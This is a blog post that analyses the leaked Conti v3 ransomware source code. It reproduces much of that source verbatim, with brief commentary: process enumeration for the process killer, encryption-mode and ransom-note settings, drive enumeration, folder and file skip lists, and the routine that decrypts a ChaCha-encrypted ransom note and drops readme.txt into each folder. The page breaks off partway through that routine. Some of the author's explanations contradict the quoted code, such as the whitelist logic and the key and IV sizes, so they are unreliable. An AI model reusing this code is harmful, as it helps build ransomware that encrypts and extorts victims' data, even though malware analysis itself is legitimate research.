<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>Conti v3 Ransomeware Souce Code Analysis · scr1pt's blog</title><meta name="description" content="prockillerprockilldermemorySnapshot
pCreateToolhelp32Snapshot
pProcess32FirstW
pProcess32NextW

123456789101112131415161718192021222324252627282930313"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Conti v3 Ransomeware Souce Code Analysis</a></h3></div><div class="post-content"><p><h2 id="prockiller"><a href="#prockiller" class="headerlink" title="prockiller"></a>prockiller</h2><h3 id="prockillder"><a href="#prockillder" class="headerlink" title="prockillder"></a>prockillder</h3><h4 id="memorySnapshot"><a href="#memorySnapshot" class="headerlink" title="memorySnapshot"></a>memorySnapshot</h4><ul>
<li>pCreateToolhelp32Snapshot</li>
<li>pProcess32FirstW</li>
<li>pProcess32NextW</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;prockiller.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../obfuscation/MetaString.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">process_killer::GetWhiteListProcess</span><span class="params">(__out PPID_LIST PidList)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32W pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pProcess32FirstW(hSnapShot, &amp;pe32)) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!plstrcmpiW(pe32.szExeFile, OBFW(<span class="string">L&quot;explorer.exe&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">			PPID Pid = (PPID)m_malloc(<span class="keyword">sizeof</span>(PID));</span><br><span class="line">			<span class="keyword">if</span> (!Pid) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Pid-&gt;dwProcessId = pe32.th32ProcessID;</span><br><span class="line">			TAILQ_INSERT_TAIL(PidList, Pid, Entries);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (pProcess32NextW(hSnapShot, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	pCloseHandle(hSnapShot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tagPROCESSENTRY32W</span><br><span class="line">&#123;</span><br><span class="line"> DWORD   dwSize;</span><br><span class="line"> DWORD   cntUsage;</span><br><span class="line"> DWORD   th32ProcessID;          // this process</span><br><span class="line"> ULONG_PTR th32DefaultHeapID;</span><br><span class="line"> DWORD   th32ModuleID;           // associated exe</span><br><span class="line"> DWORD   cntThreads;</span><br><span class="line"> DWORD   th32ParentProcessID;    // this process&#x27;s parent process</span><br><span class="line"> LONG    pcPriClassBase;         // Base priority of process&#x27;s threads</span><br><span class="line"> DWORD   dwFlags;</span><br><span class="line"> WCHAR   szExeFile[MAX_PATH];    // Path</span><br><span class="line">&#125; PROCESSENTRY32W;</span><br></pre></td></tr></table></figure>

<p>szExeFile为进程运行文件路径</p>
</blockquote>
<h4 id="Whitelist"><a href="#Whitelist" class="headerlink" title="Whitelist"></a>Whitelist</h4><p>把进程名不为explorer.exe的进程全都插入到白名单进程列表中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>	TAILQ_INSERT_TAIL(head, elm, field) do &#123;			\</span></span><br><span class="line"><span class="meta">	TAILQ_NEXT((elm), field) = NULL;				\</span></span><br><span class="line"><span class="meta">	(elm)-&gt;field.tqe_prev = (head)-&gt;tqh_last;			\</span></span><br><span class="line"><span class="meta">	*(head)-&gt;tqh_last = (elm);					\</span></span><br><span class="line"><span class="meta">	(head)-&gt;tqh_last = &amp;TAILQ_NEXT((elm), field);			\</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>

<h2 id="global"><a href="#global" class="headerlink" title="global"></a>global</h2><p>set some global parameters,maybe used to build different character sample(extension,mutex…..)</p>
<ul>
<li>Extention</li>
<li>DecryptionNote</li>
<li>EncryptMode<ul>
<li>ALL_ENCRYPT 10</li>
<li>LOCAL_ENCRYPT 11</li>
<li>NETWORK_ENCRYPT 12</li>
<li>BACKUPS_ENCRYPT 13</li>
<li>PATH_ENCRYPT 14</li>
</ul>
</li>
<li>IsProcKillerEnabled</li>
<li>EncryptPath</li>
<li>EncryptSize</li>
<li>MutexName</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">STATIC WCHAR g_Extention[<span class="number">7</span>] = <span class="string">L&quot;.EXTEN&quot;</span>;</span><br><span class="line">STATIC CHAR g_DecryptNote[<span class="number">2048</span>] = <span class="string">&quot;__DECRYPT_NOTE__&quot;</span>;</span><br><span class="line">STATIC INT g_EncryptMode = ALL_ENCRYPT;</span><br><span class="line">STATIC BOOL g_IsProcKillerEnabled = FALSE;</span><br><span class="line">STATIC LPCWSTR g_EncryptPath = <span class="literal">NULL</span>;</span><br><span class="line">STATIC BYTE g_EncryptSize = <span class="number">50</span>;</span><br><span class="line"><span class="comment">//STATIC CHAR g_MutexName[65] = &quot;__MUTEX_NAME__&quot;;</span></span><br><span class="line"></span><br><span class="line">PWCHAR </span><br><span class="line"><span class="title function_">global::GetExtention</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_Extention;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR </span><br><span class="line"><span class="title function_">global::GetDecryptNote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_DecryptNote;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR</span><br><span class="line"><span class="title function_">global::GetMutexName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//return g_MutexName;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetEncryptMode</span><span class="params">(INT EncryptMode)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptMode = EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INT</span><br><span class="line"><span class="title function_">global::GetEncryptMode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetProcKiller</span><span class="params">(BOOL IsEnabled)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_IsProcKillerEnabled = IsEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::GetProcKiller</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_IsProcKillerEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">global::SetEncryptPath</span><span class="params">(__in LPCWSTR Path)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptPath = Path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPCWSTR</span><br><span class="line"><span class="title function_">global::GetEncryptPath</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptPath;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::SetEncryptSize</span><span class="params">(__in INT Size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Size != <span class="number">10</span> ||</span><br><span class="line">		Size != <span class="number">15</span> ||</span><br><span class="line">		Size != <span class="number">20</span> ||</span><br><span class="line">		Size != <span class="number">25</span> ||</span><br><span class="line">		Size != <span class="number">30</span> ||</span><br><span class="line">		Size != <span class="number">35</span> ||</span><br><span class="line">		Size != <span class="number">40</span> ||</span><br><span class="line">		Size != <span class="number">45</span> ||</span><br><span class="line">		Size != <span class="number">50</span> ||</span><br><span class="line">		Size != <span class="number">60</span> ||</span><br><span class="line">		Size != <span class="number">70</span> ||</span><br><span class="line">		Size != <span class="number">80</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		g_EncryptSize = <span class="number">50</span>;</span><br></pre></td></tr></table></figure>

<h2 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h2><h3 id="logs-1"><a href="#logs-1" class="headerlink" title="logs"></a>logs</h3><ul>
<li>va_start</li>
<li>va_arg</li>
<li>va_end</li>
</ul>
<p>The <strong>RtlSecureZeroMemory</strong> routine fills a block of memory with zeros in a way that is guaranteed to be secure.</p>
<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><blockquote>
<p>init in function main:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(<span class="string">L&quot;-log&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (LogFile) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Init(LogFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">logs::Init(LPCWSTR LogFile)</span><br><span class="line">&#123;</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CritSec);</span><br><span class="line">	g_LogHandle = pCreateFileW(</span><br><span class="line">		LogFile,</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_ALWAYS,</span><br><span class="line">		FILE_FLAG_WRITE_THROUGH,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pSetFilePointer(g_LogHandle, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_END);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>write some errors.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logs::Write(OBFW(L&quot;FindFirstFile fails in directory %s. GetLastError = %lu.&quot;), CurrentDirectory.c_str(), pGetLastError());</span><br></pre></td></tr></table></figure>

<h2 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h2><h3 id="filesystem-1"><a href="#filesystem-1" class="headerlink" title="filesystem"></a>filesystem</h3><h4 id="disks"><a href="#disks" class="headerlink" title="disks"></a>disks</h4><ul>
<li>SIZE_T BufferLength &#x3D; (SIZE_T)pGetLogicalDriveStringsW(0, NULL); </li>
<li>pGetLogicalDriveStringsW(BufferLength, Buffer);</li>
</ul>
<blockquote>
<p>GetLogicalDriveStringsW</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD GetLogicalDriveStringsW(</span><br><span class="line">[in]  DWORD  nBufferLength,</span><br><span class="line">[out] LPWSTR lpBuffer</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>If the function succeeds, the return value is the length, in characters, of the strings copied to the buffer, not including the terminating null character. Note that an ANSI-ASCII null character uses one byte, but a Unicode (UTF-16) null character uses two bytes.</p>
<p>If the buffer is not large enough, the return value is greater than <em>nBufferLength</em>. It is the size of the buffer required to hold the drive strings.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;filesystem.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../logs/logs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">INT </span><br><span class="line"><span class="title function_">filesystem::EnumirateDrives</span><span class="params">(__in PDRIVE_LIST DriveList)</span></span><br><span class="line">&#123;</span><br><span class="line">	INT Length = <span class="number">0</span>;</span><br><span class="line">	INT DrivesCount = <span class="number">0</span>;</span><br><span class="line">	DWORD DriveType = <span class="number">0</span>;</span><br><span class="line">	TAILQ_INIT(DriveList);</span><br><span class="line"></span><br><span class="line">	SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!BufferLength) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + <span class="number">1</span>) * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">	<span class="keyword">if</span> (!Buffer) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pGetLogicalDriveStringsW(BufferLength, Buffer);</span><br><span class="line">	</span><br><span class="line">	LPWSTR tempBuffer = Buffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Length = (INT)plstrlenW(tempBuffer)) &#123;</span><br><span class="line"></span><br><span class="line">		PDRIVE_INFO DriveInfo = new DRIVE_INFO;</span><br><span class="line">		<span class="keyword">if</span> (!DriveInfo) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(Buffer);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		DriveInfo-&gt;RootPath = tempBuffer;</span><br><span class="line">		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);</span><br><span class="line"></span><br><span class="line">		DrivesCount++;</span><br><span class="line">		tempBuffer += Length + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	logs::Write(OBFW(<span class="string">L&quot;Found %d drives: &quot;</span>), DrivesCount);</span><br><span class="line"></span><br><span class="line">	PDRIVE_INFO DriveInfo = <span class="literal">NULL</span>;</span><br><span class="line">	TAILQ_FOREACH(DriveInfo, DriveList, Entries) &#123;</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;%s&quot;</span>), DriveInfo-&gt;RootPath.c_str());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(Buffer);</span><br><span class="line">	<span class="keyword">return</span> DrivesCount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><ul>
<li><p>MakeSearchMask</p>
<ul>
<li>used to generate a search mask path</li>
</ul>
</li>
<li><p>MakePath</p>
<ul>
<li>used to generate the file path</li>
</ul>
</li>
<li><p>CheckDirectory</p>
<ul>
<li><p>check if the <code>directory</code> is in the Blacklist, if yes then pass this directory. This is to make sure the system running without breaking.</p>
<ul>
<li>&#96;&#96;&#96;<br>  OBFW(L”tmp”),<br>         OBFW(L”winnt”),<br>         OBFW(L”temp”),<br>         OBFW(L”thumb”),<br>         OBFW(L”$Recycle.Bin”),<br>         OBFW(L”$RECYCLE.BIN”),<br>         OBFW(L”System Volume Information”),<br>         OBFW(L”Boot”),<br>         OBFW(L”Windows”),<br>         OBFW(L”Trend Micro”),<br>         OBFW(L”perflogs”)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- CheckFilename</span><br><span class="line"></span><br><span class="line">    - check if the `file` is in the Blacklist, if yes then pass this file. This is to make sure the system running without breaking.</span><br><span class="line"></span><br><span class="line">        - ```</span><br><span class="line">            	OBFW(L&quot;.exe&quot;),</span><br><span class="line">               		OBFW(L&quot;.dll&quot;),</span><br><span class="line">               		OBFW(L&quot;.lnk&quot;),</span><br><span class="line">               		OBFW(L&quot;.sys&quot;),</span><br><span class="line">               		OBFW(L&quot;.msi&quot;),</span><br><span class="line">               		OBFW(L&quot;readme.txt&quot;),</span><br><span class="line">               		OBFW(L&quot;CONTI_LOG.txt&quot;),</span><br><span class="line">               		OBFW(L&quot;.bat&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>DropInstruction</p>
<ul>
<li>release the reame.txt to every directory that is encrypted by Ransomeware.</li>
<li>the DecryptionNotes is encrypted with chacha<ul>
<li>the first 16 bytes is the key</li>
<li>the 16-20 bytes is the iv</li>
<li>the follow is the encrypted data</li>
</ul>
</li>
</ul>
</li>
<li><p>SearchFiles</p>
</li>
</ul>
<h4 id="DropInstruction"><a href="#DropInstruction" class="headerlink" title="DropInstruction"></a>DropInstruction</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">DropInstruction(__in <span class="built_in">std</span>::<span class="built_in">wstring</span> Directory)</span><br><span class="line">&#123;</span><br><span class="line">	LPCWSTR str = OBFW(<span class="string">L&quot;readme.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">wstring</span> Filename = MakePath(Directory, str);</span><br><span class="line"></span><br><span class="line">	HANDLE hFile = pCreateFileW(</span><br><span class="line">		Filename.c_str(),</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		CREATE_ALWAYS,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwDecryptNote = <span class="number">0</span>;</span><br><span class="line">	LPSTR DecryptNote = global::GetDecryptNote();</span><br><span class="line"></span><br><span class="line">	ECRYPT_ctx CryptCtx;</span><br><span class="line">	BYTE ChaChaKey[<span class="number">32</span>];</span><br><span class="line">	BYTE ChaChaIV[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaKey, DecryptNote, <span class="number">32</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaIV, DecryptNote + <span class="number">32</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;dwDecryptNote, DecryptNote + <span class="number">40</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote);</span><br><span class="line">	<span class="keyword">if</span> (!DecryptNotePlainText) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(&amp;CryptCtx, <span class="keyword">sizeof</span>(CryptCtx));</span><br><span class="line">  ECRYPT_keysetup(&amp;CryptCtx, ChaChaKey, <span class="number">256</span>, <span class="number">64</span>);</span><br><span class="line">	ECRYPT_ivsetup(&amp;CryptCtx, ChaChaIV);</span><br><span class="line"></span><br><span class="line">	ECRYPT_decrypt_bytes(&amp;CryptCtx, (PBYTE)DecryptNote + <span class="number">44</span>, (PBYTE)DecryptNotePlainText, dwDecryptNote);</span><br><span class="line"></span><br><span class="line">	DWORD BytesWritten;</span><br><span class="line">	pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &amp;BytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">	pCloseHandle(hFile);</span><br><span class="line">	